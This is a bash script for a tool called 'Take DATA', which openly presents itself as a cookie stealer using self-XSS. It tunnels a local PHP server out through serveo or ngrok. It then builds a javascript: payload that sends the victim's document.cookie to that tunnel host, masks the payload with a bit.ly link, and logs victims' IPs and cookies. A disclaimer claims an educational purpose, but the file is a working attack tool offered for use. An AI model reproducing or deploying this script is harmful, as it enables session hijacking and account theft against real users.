#!/bin/bash
# Take DATA v1.0
# Developed by: S.SATHIYANARAYANA  && PRITHVEE PRAKASH
# Github link: https://github.com/SN-Corporations/T-DATA
# Disclaimer: Attacking any targets without prior mutual consent is illegal and most important I'm not Responsible for any Damage Caused by You.
trap 'printf "\n";stop' 2

##Bit.ly INFO

email="" # Enter your Bit.ly  I'D
password="" # Enter your Bit.ly  Password


###

banner() {

lazy='\'

printf "\e[1;92m                                                                  \e[0m\n"
printf "\e[1;92m                                         xx          xx           \e[0m\n"
printf "\e[1;92m   xxxx     xxxx                           xx      xx             \e[0m\n"
printf "\e[1;92m  xx  xx  xx   xx    xxxxxx                  xx  xx               \e[0m\n"
printf "\e[1;92m  xx    xx     xx    xx   xx                   xx                 \e[0m\n"
printf "\e[1;92m  xx           xx    xxxxxx                  xx  xx               \e[0m\n"
printf "\e[1;92m  xx           xx    xx xx                 xx      xx             \e[0m\n"
printf "\e[1;92m  xx           xx    xx  xx    _____     xx          xx     _____ \e[0m\n"
printf "\e[1;92m                                                                  \e[0m\n"
printf "\e[1;92m  ______________________________________________________________  \e[0m\n"
printf "\e[1;92m  ______________                   _______           ______       _____________         ______        \e[0m\n"
printf "\e[1;92m  \____   _____/                  |  ____ \         /  __  \      \____   ____/        /  __  \       \e[0m\n"
printf "\e[1;92m       |  |                       | |    \ \       /  /  \  \          |  |           /  /  \  \      \e[0m\n"
printf "\e[1;92m       |  |       __________      | |     | |     /  /____\  \         |  |          /  /____\  \     \e[0m\n"
printf "\e[1;92m       |  |      |__________|     | |____/ /     /  /      \  \        |  |         /  /      \  \    \e[0m\n"
printf "\e[1;92m       |__|                       |_______/     /__/        \__\       |__|        /__/        \__\   \e[0m\n"
printf "\e[1;92m                                                                  \e[0m\n"


printf            "\e[1;92m         https://github.com/SN-Corporations/T-DATA              \e[0m\n"
printf "                  \e[101m\e[1;77m CAUTION : This is a POWERFUL Cookie Stealing  Tool     \e[0m\n" 
printf "                  \e[101m\e[1;77m  by the Method of XSS (Cross Site Scripting)           \e[0m\n"
printf "\e[1;92m                                                                  \e[0m\n"
printf "                  \e[103m\e[1;77m  We Developed this Tool only for EDUCATION  &&  RESEARCH Purpose   \e[0m\n"
printf "                  \e[103m\e[1;77m    !!!  We Don't responsible for any Dammage caused by YOU  !!!    \e[0m\n"
printf "\e[1;92m                                                                  \e[0m\n"
printf "                          \e[101m\e[1;77m   Use it on your own RISK  \e[0m\n"
printf "\e[1;92m                             &&                                   \e[0m\n"
printf                    "\e[1;92m                       MOST IMPORTANT                             \e[0m\n"
printf                    "\e[1;92m            Make Sure Create an Acoount on BIT.LY                 \e[0m\n"

printf "                       \e[104m\e[1;77m    Follows us on SOCIAL MEDIAS to get Day_to_Day Updates on CYBER SECURITY News...!!!  \e[0m\n"

printf "        Twitter:   @  SavionicC\n"
printf "        LinkedIn:  @  SAVIONIC NETWORK CORPORATION\n"
printf "        Instagram: @  s_n_corporation\n"
printf "        Facebook:  @  SN Corporations\n"



}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting untill targets clicks the open the link,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Successfully our Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi


if [[ -e "cookies.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cookies saved: \e[0m\e[1;77mcookies.backup\n\e[0m" 
cat cookies.txt >> cookies.backup
rm -rf cookies.txt
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
                                               else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Server:\e[0m\e[1;77m %s\n' $send_link

}



ngrok_server() {

if [[ $email == "" ]]; then
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Bit.ly Credentials \e[0m\n'
printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Email: \e[0m"
read email
fi


if [[ $password == "" ]]; then
IFS=$'\n'                        
read -s -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Password: \e[0m' password

fi
printf "\n"

if [[ -e ngrok ]]; then
echo ""
                                                 else
		command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Server:\e[0m\e[1;77m %s\e[0m\n" $link

payload
bitlink
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

default_website="https://instagram.com"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a website (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m ): \e[0m" $default_website
read website_link
website_link="${website_link:-${default_website}}"

if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok=true
ngrok_server

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {


sed 's+redirect_link+'$website_link'+g' get.php > index.php


}


bitlink() {

if     

[[ $ngrok == true ]]; then
get_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

else
get_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
fi

token=$(curl -s -u                                          "$email:$password" -X POST "https://api-ssl.bitly.com/oauth/access_token")


guid=$(curl -s -X GET "https://api-ssl.bitly.com/v4/groups" -H "Authorization: Bearer $token" | grep -o '"guid":"[0-9A-Za-z]*\"' | cut -d ':' -f2 | tr -d '"')

long_url="$website_link/javascript:window.location='$get_link/?c='+document.cookie"

bitly_link=$(curl -s -X POST "https://api-ssl.bitly.com/v4/bitlinks" -H "Authorization: Bearer $token" -H "Content-Type: application/json" -d "{\"group_guid\":\"$guid\", \"long_url\": \"$long_url\" }" | grep -o '"link":"http://bit.ly/[0-9a-zA-Z]*\"' | cut -d '"' -f4)


printf "\e[1;92m[\e[0m*\e[1;92m] Usage:\e[0m\n"
printf "   \e[91m This Program make execute on our victims browser and steal all cookie and send to attacker(You)\n"
			printf "   		 bit.ly link pointing to: website.com/javascript:malicious_code\n"
			printf "    	When Our Victim clicks the link,our Victim is tricked into executing this code after website.com/\n"
		printf "    	When our code executed, the malicious script grabs the cookies from website.com\n"
		printf "\e[1;92m[\e[0m*\e[1;92m] Bit.ly link:\e[0m\e[1;77m %s\e[0m\n" $bitly_link


		}

		start() {

default_choose_sub="Y"
default_subdomain="selfxss$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? \e[0m\e[1;77m [Y/n] \e[0m\e[1;33m: \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi


if [[ $email == "" ]]; then
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Bit.ly Credentials \e[0m\n'
printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Email: \e[0m"
read email
fi


if [[ $password == "" ]]; then
IFS=$'\n'
read -s -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Password: \e[0m' password

fi

server
payload
bitlink
checkfound

}

banner
dependencies
start1

